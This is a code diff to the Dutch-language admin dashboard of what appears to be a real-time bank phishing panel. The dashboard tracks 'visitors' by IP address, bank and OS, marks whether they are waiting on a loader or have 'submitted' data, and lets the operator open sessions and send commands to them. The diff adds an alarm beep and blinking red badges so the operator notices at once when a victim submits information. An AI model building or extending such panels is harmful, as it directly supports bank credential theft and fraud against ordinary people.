@@ -50,6 +50,14 @@ function parseOS(ua) {
   return "Onbekend";
 }
 
+// True when the visitor sits on the loader waiting for the admin:
+// either fresh on "waiting" or just submitted data (*_submitted).
+function needsAction(v, t) {
+  if (!isOnline(v, t || Date.now())) return false;
+  const s = v.status || "";
+  return s === "waiting" || s.endsWith("_submitted");
+}
+
 function sendCommandLegacy(visitorId, command) {
   const map = readCommands();
   map[visitorId] = { type: command, at: Date.now(), by: "admin" };
@@ -474,24 +482,58 @@ export default function Admin() {
     } catch {}
   }
 
-  // Auto-connect: on the live visitors (dashboard) page only, a newly arrived
-  // online visitor pops open by itself — no button. Login shows directly on
-  // the visitor side, so fresh arrivals on the loader OR on login qualify.
-  // Fresh arrivals only (joined < 2 min ago) so old rows never yank the screen.
+  // Needs admin action: sitting on the loader (waiting) or just submitted data.
+  // Runs on every render, but only beeps for NEW arrivals — never loops.
+  const [soundOn, setSoundOn] = useState(() => {
+    try {
+      return localStorage.getItem("admin_sound") !== "0";
+    } catch {
+      return true;
+    }
+  });
+  const alertedRef = useRef(new Set());
+  function beep() {
+    try {
+      const C = window.AudioContext || window.webkitAudioContext;
+      if (!C) return;
+      const ctx = new C();
+      if (ctx.state === "suspended") ctx.resume().catch(() => {});
+      const t = ctx.currentTime;
+      // Powerful alternating alarm: 3x high-low, triangle wave, high gain.
+      const seq = [1175, 880, 1175, 880, 1175, 880];
+      seq.forEach((f, i) => {
+        const dt = i * 0.22;
+        const o = ctx.createOscillator();
+        const g = ctx.createGain();
+        o.connect(g);
+        g.connect(ctx.destination);
+        o.frequency.value = f;
+        o.type = "triangle";
+        g.gain.setValueAtTime(0.001, t + dt);
+        g.gain.exponentialRampToValueAtTime(0.9, t + dt + 0.02);
+        g.gain.setValueAtTime(0.9, t + dt + 0.15);
+        g.gain.exponentialRampToValueAtTime(0.001, t + dt + 0.2);
+        o.start(t + dt);
+        o.stop(t + dt + 0.22);
+      });
+      setTimeout(() => ctx.close(), 1800);
+    } catch {}
+  }
   useEffect(() => {
-    if (!authed || sessionId) return;
-    if (tab !== "dashboard") return;
-    const t = Date.now();
-    const cand = allList.find(
-      (x) =>
-        isOnline(x, t) &&
-        (x.status === "waiting" || x.status === "login_requested") &&
-        !dismissedRef.current.has(x.id) &&
-        t - (x.joinedAt || t) < 120000
-    );
-    if (cand) openSession(cand);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [authed, sessionId, tab, allList]);
+    if (!authed) return;
+    const alive = new Set();
+    allList.forEach((x) => {
+      const need =
+        isOnline(x, Date.now()) &&
+        ((x.status || "") === "waiting" || (x.status || "").endsWith("_submitted"));
+      if (need) {
+        const key = `${x.id}:${x.status}`;
+        alive.add(key);
+        if (soundOn && !alertedRef.current.has(key)) beep();
+      }
+    });
+    alertedRef.current = alive;
+  });
 
   function sendCommandLocal(visitorId, command) {
     const at = Date.now();
@@ -583,6 +625,28 @@ export default function Admin() {
               <span className="hidden sm:inline">{onlineCount} live</span>
               <span className="sm:hidden">{onlineCount}</span>
             </span>
+            <button
+              onClick={() => {
+                const n = !soundOn;
+                setSoundOn(n);
+                try {
+                  localStorage.setItem("admin_sound", n ? "1" : "0");
+                } catch {}
+                if (n) beep();
+              }}
+              title={soundOn ? "Geluid uit" : "Geluid aan"}
+              aria-label={soundOn ? "Geluid uit" : "Geluid aan"}
+              className={`flex h-9 w-9 items-center justify-center rounded-full ring-1 transition active:scale-95 ${soundOn ? "bg-fuchsia-600/25 text-fuchsia-200 ring-fuchsia-400/30" : "bg-white/[0.06] text-purple-300/60 ring-white/10"}`}
+            >
+              <svg viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M11 5 6 9H2v6h4l5 4z" />
+                {soundOn ? (
+                  <path d="M15.5 8.5a5 5 0 0 1 0 7 M18.5 5.5a9.4 9.4 0 0 1 0 13" />
+                ) : (
+                  <path d="m16 9 5 6 M21 9l-5 6" />
+                )}
+              </svg>
+            </button>
             <button onClick={doLogout} className="hidden items-center gap-1.5 rounded-full px-3 py-2 text-[13px] font-bold text-purple-200/80 transition hover:bg-white/10 hover:text-white sm:flex">
               <NavIcon k="logout" className="h-4 w-4" />
               Uitloggen
@@ -719,13 +783,21 @@ export default function Admin() {
                     <tbody>
                       {paged.map((v) => {
                         const online = isOnline(v, now);
+                        const wait = needsAction(v, now);
                         return (
-                          <tr key={v.id} className="border-t border-white/5 hover:bg-white/5">
+                          <tr key={v.id} className={`border-t border-white/5 hover:bg-white/5 ${wait ? "bg-red-500/[0.07] ring-1 ring-inset ring-red-500/40" : ""}`}>
                             <td className="whitespace-nowrap px-4 py-3">
-                              <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-                                <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
-                                {online ? "Online" : "Offline"}
-                              </span>
+                              {wait ? (
+                                <span className="wait-blink inline-flex items-center gap-1.5 rounded-full bg-red-500 px-2.5 py-1 text-[12px] font-extrabold uppercase tracking-wide text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]">
+                                  <span className="h-1.5 w-1.5 rounded-full bg-white" />
+                                  Wachten
+                                </span>
+                              ) : (
+                                <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
+                                  <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
+                                  {online ? "Online" : "Offline"}
+                                </span>
+                              )}
                             </td>
                             <td className="whitespace-nowrap px-4 py-3 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
                             <td className="whitespace-nowrap px-4 py-3 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NIET GESELECTEERD"}</td>
@@ -756,17 +828,24 @@ export default function Admin() {
                 <div className="admin-scroll mt-3 max-h-[calc(100dvh-320px)] space-y-2.5 overflow-y-auto pr-0.5 md:hidden">
                   {paged.map((v) => {
                     const online = isOnline(v, now);
+                    const wait = needsAction(v, now);
                     return (
-                      <div key={v.id} className="w-full rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10">
+                      <div key={v.id} className={`w-full rounded-xl bg-[#1d1430] p-3 ring-1 ${wait ? "ring-2 ring-red-500/60" : "ring-white/10"}`}>
                         <div className="flex items-center gap-2.5">
                           <MiniLogo slug={v.bank} name={v.bankName} />
                           <div className="min-w-0 flex-1">
                             <p className="truncate font-mono text-[14px] font-bold text-purple-100">{v.ip || "…"}</p>
                             <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NIET GESELECTEERD"} • {parseOS(v.ua)}</p>
                           </div>
-                          <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-                            {online ? "Online" : "Offline"}
-                          </span>
+                          {wait ? (
+                            <span className="wait-blink shrink-0 rounded-full bg-red-500 px-2.5 py-1 text-[12px] font-extrabold uppercase text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]">
+                              Wachten
+                            </span>
+                          ) : (
+                            <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
+                              {online ? "Online" : "Offline"}
+                            </span>
+                          )}
                         </div>
                         <div className="mt-2.5 flex gap-1.5">
                           <button onClick={() => openSession(v)} className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[14px] font-bold text-white">
@@ -940,8 +1019,8 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
             <p className="text-[12px] text-purple-300">{STATUS_LABEL[v.status] || v.status}</p>
           </div>
         </div>
-        <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-          {online ? "● Online" : "● Offline"}
+        <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${needsAction(v, now) ? "wait-blink bg-red-500 text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]" : online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
+          {needsAction(v, now) ? "● Wachten op actie" : online ? "● Online" : "● Offline"}
         </span>
       </div>
 
